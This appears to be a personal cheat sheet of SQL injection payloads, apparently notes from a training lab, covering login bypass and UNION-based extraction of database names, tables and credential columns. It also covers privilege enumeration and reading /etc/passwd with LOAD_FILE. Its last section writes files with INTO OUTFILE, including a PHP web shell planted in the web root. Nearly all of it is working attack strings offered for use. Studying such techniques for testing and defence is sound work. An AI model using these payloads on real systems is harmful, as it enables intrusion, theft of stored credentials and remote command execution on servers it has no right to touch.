# SQL injections
Logging to a mysql server using `mysql`:
```
mysql -P 49336 -u root -h 94.237.55.124 -p
```

Some commen patterns for SQL injections:
```sql
SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';
SELECT * FROM logins WHERE username='admin'--' AND password = 'p@ssw0rd';
```

```sql
SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password = '1aabac6d068eef6a7bad3fdf50a05cc8';
```
INJECT THIS AS USERNAME:
```sql
admin' OR id = 5); -- '
```
Which results in:
```sql
SELECT * FROM logins WHERE (username='admin' OR id = 5); -- ' ' AND id > 1) AND password = '1aabac6d068eef6a7bad3fdf50a05cc8';
```

# Union based extraction
Find databases available:
```sql
' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```
(make sure too match the numbers of colums -> can be found by injecting order_by X until it fails)

Find tables of the database
```
' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

Find columns of table
```
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

Dump data of interest
```
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

# Find user privileges

Sql injection to get the username:
```
' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```

Find privileges of the user:
```
' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- - All users

' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- - Specific user
```

If we have file permission we can attempt to read a file:
```
' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

To write files we need the `SECURE_FILE_PRIV` variable set...
We can check this with 
```
' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
````

Actually writing a file to a specified location:
```
' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```

Uploading a webshell:
```
' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```









